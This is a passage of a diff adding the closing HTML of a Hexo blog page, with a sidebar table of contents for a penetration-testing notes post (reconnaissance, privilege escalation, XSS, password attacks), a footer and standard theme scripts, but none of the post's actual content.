+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Intelligence-Gather"><span class="nav-number">1.</span> <span class="nav-text">Intelligence-Gather</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tools"><span class="nav-number">1.1.</span> <span class="nav-text">tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP"><span class="nav-number">1.2.</span> <span class="nav-text">SNMP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#snmpwalk"><span class="nav-number">1.2.1.</span> <span class="nav-text">snmpwalk</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulnerability-Scanner"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability Scanner</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何找到Secure-shellcode"><span class="nav-number">3.</span> <span class="nav-text">如何找到Secure shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#网络的exploit"><span class="nav-number">3.1.</span> <span class="nav-text">网络的exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Post-Exploit之文件上传"><span class="nav-number">4.</span> <span class="nav-text">Post Exploit之文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Post-Exploit之Privilege-Escalation"><span class="nav-number">5.</span> <span class="nav-text">Post Exploit之Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Target-Machine为Linux"><span class="nav-number">5.1.</span> <span class="nav-text">Target Machine为Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Target-Machine为Windows"><span class="nav-number">5.2.</span> <span class="nav-text">Target Machine为Windows</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端攻击"><span class="nav-number">6.</span> <span class="nav-text">客户端攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web应用攻击"><span class="nav-number">7.</span> <span class="nav-text">Web应用攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-number">7.1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FI-Vulneriailities"><span class="nav-number">7.2.</span> <span class="nav-text">FI Vulneriailities</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Password-Attacks"><span class="nav-number">8.</span> <span class="nav-text">Password Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取windows哈希密码"><span class="nav-number">8.1.</span> <span class="nav-text">获取windows哈希密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取windows明文密码"><span class="nav-number">8.2.</span> <span class="nav-text">获取windows明文密码</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ꭰ</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
